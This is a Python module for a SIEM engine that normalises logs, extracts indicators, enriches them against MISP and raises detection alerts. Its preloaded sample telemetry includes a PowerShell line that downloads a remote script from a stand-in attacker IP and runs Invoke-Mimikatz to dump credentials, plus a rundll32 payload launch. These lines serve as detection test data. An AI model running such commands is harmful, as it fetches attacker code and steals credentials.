"""
SentinelX SIEM Core Engine
Performs real-time log ingestion, ECS normalization, automated IOC extraction,
MISP threat intelligence enrichment, and Sigma/Wazuh rule correlation.
"""

import os
import re
import json
import time
from datetime import datetime, timezone
from typing import Dict, Any, List, Optional, Tuple

from .misp_enricher import MISPEnricher
from .detection_engine import DetectionEngine

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DATA_DIR = os.path.join(BASE_DIR, "data")
EVENTS_FILE = os.path.join(DATA_DIR, "events.json")
ALERTS_FILE = os.path.join(DATA_DIR, "alerts.json")


class SIEMEngine:
    """Central SIEM telemetry processing pipeline."""

    def __init__(self, enricher: MISPEnricher, detection_engine: DetectionEngine):
        self.enricher = enricher
        self.detection = detection_engine
        self.alerts = []
        self.events = []
        self.alerts = self._load_alerts()
        self.events = self._load_events()

    def _load_events(self) -> List[Dict[str, Any]]:
        os.makedirs(DATA_DIR, exist_ok=True)
        if os.path.exists(EVENTS_FILE):
            try:
                with open(EVENTS_FILE, "r", encoding="utf-8") as f:
                    return json.load(f)
            except Exception:
                pass
        return self._generate_default_telemetry()

    def _load_alerts(self) -> List[Dict[str, Any]]:
        os.makedirs(DATA_DIR, exist_ok=True)
        if os.path.exists(ALERTS_FILE):
            try:
                with open(ALERTS_FILE, "r", encoding="utf-8") as f:
                    return json.load(f)
            except Exception:
                pass
        return []

    def _generate_default_telemetry(self) -> List[Dict[str, Any]]:
        """Preload realistic telemetry matching Mukesh's SOC lab."""
        default_events = [
            # Event 1: Mukesh's verified Zeek to MISP positive test
            {
                "event_id": "EVT-ZEEK-001",
                "timestamp": "2026-09-20T16:00:12Z",
                "source": "zeek",
                "log_type": "http",
                "host": "Windows-11-Endpoint",
                "agent_id": "001",
                "src_ip": "10.0.2.15",
                "src_port": 51234,
                "dst_ip": "10.0.2.4",
                "dst_port": 80,
                "http_host": "192.0.2.123",
                "http_uri": "/index.html",
                "http_method": "GET",
                "http_user_agent": "curl/8.4.0",
                "status_code": 200,
                "process_name": "curl.exe",
                "command_line": "curl -H 'Host: 192.0.2.123' http://10.0.2.4/",
                "raw_log": "1726848012.12\tCq23x\t10.0.2.15\t51234\t10.0.2.4\t80\t1\tGET\t192.0.2.123\t/index.html\t-\t1.1\tcurl/8.4.0\t-\t0\t5220\t200\tOK",
                "severity": "High"
            },
            # Event 2: Mukesh's verified Sysmon Event ID 1 PowerShell test
            {
                "event_id": "EVT-SYSMON-001",
                "timestamp": "2026-09-20T10:15:02Z",
                "source": "sysmon",
                "log_type": "process_creation",
                "host": "Windows-11-Endpoint",
                "agent_id": "001",
                "src_ip": "10.0.2.15",
                "user": "WIN11\\mukesh-soc",
                "process_id": 4820,
                "parent_process_id": 3124,
                "process_name": "powershell.exe",
                "parent_process_name": "cmd.exe",
                "command_line": 'powershell.exe -NoProfile -Command "Get-Process | Select-Object -First 5"',
                "hashes": "SHA256=9A5964EF56B72213F988220A8E3F28599E6C99596B272D0B6A786277D8DBA59D",
                "wazuh_rule_id": "92027",
                "raw_log": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><EventID>1</EventID><Computer>Windows-11-Endpoint</Computer></System><EventData><Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='CommandLine'>powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 5\"</Data></EventData></Event>",
                "severity": "Low"
            },
            # Event 3: APT29 Cobalt Strike Beaconing
            {
                "event_id": "EVT-ZEEK-002",
                "timestamp": "2026-10-15T09:20:12Z",
                "source": "zeek",
                "log_type": "conn",
                "host": "Windows-11-Endpoint",
                "agent_id": "001",
                "src_ip": "10.0.2.15",
                "src_port": 49812,
                "dst_ip": "198.51.100.45",
                "dst_port": 443,
                "proto": "tcp",
                "service": "ssl",
                "duration": 58.2,
                "orig_bytes": 1420,
                "resp_bytes": 28400,
                "process_name": "rundll32.exe",
                "command_line": "rundll32.exe C:\\ProgramData\\payload.dll,DllRegisterServer",
                "raw_log": "1729012812.01\tCz98k\t10.0.2.15\t49812\t198.51.100.45\t443\ttcp\tssl\t58.2\t1420\t28400\tSF",
                "severity": "Critical"
            },
            # Event 4: Mimikatz Credential Dumping attempt
            {
                "event_id": "EVT-SYSMON-002",
                "timestamp": "2026-10-15T09:24:00Z",
                "source": "sysmon",
                "log_type": "process_access",
                "host": "Windows-11-Endpoint",
                "agent_id": "001",
                "src_ip": "10.0.2.15",
                "user": "WIN11\\mukesh-soc",
                "process_name": "powershell.exe",
                "target_process": "lsass.exe",
                "command_line": "powershell.exe -ep bypass -c IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.45/m.ps1'); Invoke-Mimikatz -DumpCreds",
                "hashes": "MD5=2b8a74e2d3f458129a0c7102e3b1c6d8",
                "raw_log": "Sysmon Event ID 10: SourceImage: powershell.exe TargetImage: C:\\Windows\\system32\\lsass.exe GrantedAccess: 0x1FFFFF",
                "severity": "Critical"
            },
            # Event 5: Normal background traffic
            {
                "event_id": "EVT-WIN-003",
                "timestamp": "2026-10-16T12:00:00Z",
                "source": "windows",
                "log_type": "security_logon",
                "host": "Windows-11-Endpoint",
                "agent_id": "001",
                "src_ip": "10.0.2.15",
                "user": "WIN11\\SYSTEM",
                "process_name": "svchost.exe",
                "command_line": "C:\\Windows\\System32\\svchost.exe -k NetworkService -p",
                "raw_log": "Security Event 4624: An account was successfully logged on. Account Name: SYSTEM",
                "severity": "Info"
            }
        ]

        for evt in default_events:
            self._process_single_event(evt, persist=False)

        self._save_events()
        self._save_alerts()
        return default_events

    def _extract_ioc_candidates(self, event: Dict[str, Any]) -> List[str]:
        candidates = set()
        
        for field in ["dst_ip", "src_ip", "http_host", "domain"]:
            val = event.get(field)
            if val and val not in ["-", "0.0.0.0", "127.0.0.1", "10.0.2.15", "10.0.2.4"]:
                candidates.add(str(val))

        hashes_str = str(event.get("hashes") or "")
        if "=" in hashes_str:
            for item in hashes_str.split(","):
                if "=" in item:
                    _, hval = item.split("=", 1)
                    candidates.add(hval.strip())
        elif len(hashes_str) in [32, 64]:
            candidates.add(hashes_str)

        text = f"{event.get('command_line', '')} {event.get('raw_log', '')}"
        ips = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", text)
        for ip in ips:
            if not ip.startswith(("127.", "10.0.2.15", "10.0.2.4")):
                candidates.add(ip)

        return list(candidates)

    def _process_single_event(self, event: Dict[str, Any], persist: bool = True) -> Dict[str, Any]:
        ioc_candidates = self._extract_ioc_candidates(event)
        enrichment_results = []
        highest_threat = None

        for ioc in ioc_candidates:
            enr = self.enricher.enrich_ioc(ioc)
            enrichment_results.append(enr)
            if enr.get("is_malicious") or enr.get("misp_match"):
                if not highest_threat or enr.get("threat_score", 0) > highest_threat.get("threat_score", 0):
                    highest_threat = enr

        event["enrichments"] = enrichment_results
        event["misp_match"] = bool(highest_threat and highest_threat.get("misp_match"))
        if highest_threat:
            event["threat_actor"] = highest_threat.get("threat_actor")
            event["threat_score"] = highest_threat.get("threat_score")

        matched_rules = self.detection.evaluate_event(event, highest_threat)
        event["alerts"] = matched_rules

        if matched_rules:
            for rule in matched_rules:
                alert_entry = {
                    "alert_id": f"ALT-{int(time.time()*1000)}-{len(self.alerts)+1}",
                    "timestamp": event.get("timestamp", datetime.now(timezone.utc).isoformat()),
                    "rule_id": rule["rule_id"],
                    "title": rule["title"],
                    "severity": rule["severity"],
                    "tactic": rule["tactic"],
                    "technique_id": rule["technique_id"],
                    "technique_name": rule["technique_name"],
                    "host": event.get("host", "Unknown Host"),
                    "agent_id": event.get("agent_id", "001"),
                    "src_ip": event.get("src_ip", "-"),
                    "dst_ip": event.get("dst_ip", "-"),
                    "process_name": event.get("process_name", "-"),
                    "command_line": event.get("command_line", "-"),
                    "misp_match": event["misp_match"],
                    "threat_actor": event.get("threat_actor", "N/A"),
                    "recommendation": rule["recommendation"],
                    "event_id": event["event_id"]
                }
                self.alerts.append(alert_entry)

        if persist:
            self._save_events()
            self._save_alerts()

        return event

    def ingest_raw_log(self, raw_content: str, log_format: str = "auto") -> Dict[str, Any]:
        raw_clean = raw_content.strip()
        if not raw_clean:
            return {"success": False, "error": "Empty log content provided"}

        ingested_count = 0
        new_events = []

        if raw_clean.startswith("{") or raw_clean.startswith("["):
            try:
                data = json.loads(raw_clean)
                items = data if isinstance(data, list) else [data]
                for item in items:
                    norm = self._normalize_json_event(item)
                    processed = self._process_single_event(norm, persist=False)
                    self.events.insert(0, processed)
                    new_events.append(processed)
                    ingested_count += 1
            except Exception as e:
                lines = raw_clean.splitlines()
                for line in lines:
                    norm = self._normalize_line(line)
                    processed = self._process_single_event(norm, persist=False)
                    self.events.insert(0, processed)
                    new_events.append(processed)
                    ingested_count += 1
        else:
            lines = raw_clean.splitlines()
            for line in lines:
                if not line.strip() or line.startswith("#"):
                    continue
                norm = self._normalize_line(line)
                processed = self._process_single_event(norm, persist=False)
                self.events.insert(0, processed)
                new_events.append(processed)
                ingested_count += 1

        self._save_events()
        self._save_alerts()

        return {
            "success": True,
            "ingested_count": ingested_count,
            "new_events": new_events[:5]
        }

    def _normalize_json_event(self, item: Dict[str, Any]) -> Dict[str, Any]:
        now_ts = datetime.now(timezone.utc).isoformat()
        evt_id = f"EVT-{int(time.time()*1000)}-{len(self.events)+1}"

        data = item.get("data", {})
        win = data.get("win", {})
        eventdata = win.get("eventdata", {})
        agent = item.get("agent", {})
        rule = item.get("rule", {})

        src_ip = eventdata.get("SourceIp") or eventdata.get("srcip") or item.get("src_ip", "10.0.2.15")
        dst_ip = eventdata.get("DestinationIp") or eventdata.get("dstip") or item.get("dst_ip", "-")
        process_name = eventdata.get("Image") or item.get("process_name", "")
        if "\\" in process_name:
            process_name = process_name.split("\\")[-1]

        command_line = eventdata.get("CommandLine") or item.get("command_line", "")
        hashes = eventdata.get("Hashes") or item.get("hashes", "")

        return {
            "event_id": evt_id,
            "timestamp": item.get("timestamp", now_ts),
            "source": item.get("source") or ("wazuh" if rule else "custom_json"),
            "log_type": item.get("log_type", "security_alert"),
            "host": agent.get("name") or item.get("host", "Windows-11-Endpoint"),
            "agent_id": agent.get("id") or item.get("agent_id", "001"),
            "src_ip": src_ip,
            "dst_ip": dst_ip,
            "process_name": process_name,
            "command_line": command_line,
            "hashes": hashes,
            "raw_log": json.dumps(item),
            "severity": rule.get("level", "Medium") if rule else item.get("severity", "Medium")
        }

    def _normalize_line(self, line: str) -> Dict[str, Any]:
        now_ts = datetime.now(timezone.utc).isoformat()
        evt_id = f"EVT-{int(time.time()*1000)}-{len(self.events)+1}"

        if "\t" in line:
            fields = line.split("\t")
            if len(fields) >= 10:
                return {
                    "event_id": evt_id,
                    "timestamp": now_ts,
                    "source": "zeek",
                    "log_type": "http" if len(fields) >= 15 else "conn",
                    "host": "Windows-11-Endpoint",
                    "agent_id": "001",
                    "src_ip": fields[2] if len(fields) > 2 else "10.0.2.15",
                    "src_port": int(fields[3]) if len(fields) > 3 and fields[3].isdigit() else 0,
                    "dst_ip": fields[4] if len(fields) > 4 else "-",
                    "dst_port": int(fields[5]) if len(fields) > 5 and fields[5].isdigit() else 0,
                    "http_host": fields[8] if len(fields) > 8 else "-",
                    "http_uri": fields[9] if len(fields) > 9 else "-",
                    "raw_log": line,
                    "severity": "Medium"
                }

        return {
            "event_id": evt_id,
            "timestamp": now_ts,
            "source": "syslog",
            "log_type": "generic",
            "host": "Windows-11-Endpoint",
            "agent_id": "001",
            "raw_log": line,
            "command_line": line,
            "severity": "Low"
        }

    def search_telemetry(self, query: str = "", limit: int = 100) -> List[Dict[str, Any]]:
        if not query:
            return self.events[:limit]

        query_clean = query.strip().lower()
        results = []

        field_filters = re.findall(r"([a-z_]+):([^\s]+)", query_clean)
        keyword_terms = re.sub(r"([a-z_]+):([^\s]+)", "", query_clean).strip().split()

        for event in self.events:
            match = True
            
            for field, val in field_filters:
                evt_val = str(event.get(field, "")).lower()
                if field == "ip":
                    evt_val = f"{event.get('src_ip','')} {event.get('dst_ip','')} {event.get('http_host','')}".lower()
                if val not in evt_val:
                    match = False
                    break

            if match and keyword_terms:
                event_str = json.dumps(event).lower()
                for term in keyword_terms:
                    if term not in event_str:
                        match = False
                        break

            if match:
                results.append(event)
                if len(results) >= limit:
                    break

        return results

    def get_dashboard_metrics(self) -> Dict[str, Any]:
        total_events = len(self.events)
        total_alerts = len(self.alerts)
        misp_hits = sum(1 for e in self.events if e.get("misp_match"))
        
        severity_counts = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Info": 0}
        for a in self.alerts:
            sev = a.get("severity", "Medium")
            if sev in severity_counts:
                severity_counts[sev] += 1
            else:
                severity_counts["Medium"] += 1

        mitre_coverage = {}
        for a in self.alerts:
            tech = a.get("technique_id")
            name = a.get("technique_name", "")
            if tech:
                mitre_coverage[f"{tech} - {name}"] = mitre_coverage.get(f"{tech} - {name}", 0) + 1

        sources = {}
        for e in self.events:
            s = e.get("source", "other")
            sources[s] = sources.get(s, 0) + 1

        return {
            "total_events": total_events,
            "total_alerts": total_alerts,
            "misp_hits": misp_hits,
            "active_endpoints": 3,
            "severity_counts": severity_counts,
            "mitre_coverage": mitre_coverage,
            "sources": sources,
            "recent_alerts": self.alerts[-10:][::-1]
        }

    def _save_events(self):
        try:
            with open(EVENTS_FILE, "w", encoding="utf-8") as f:
                json.dump(self.events, f, indent=2)
        except Exception:
            pass

    def _save_alerts(self):
        try:
            with open(ALERTS_FILE, "w", encoding="utf-8") as f:
                json.dump(self.alerts, f, indent=2)
        except Exception:
            pass
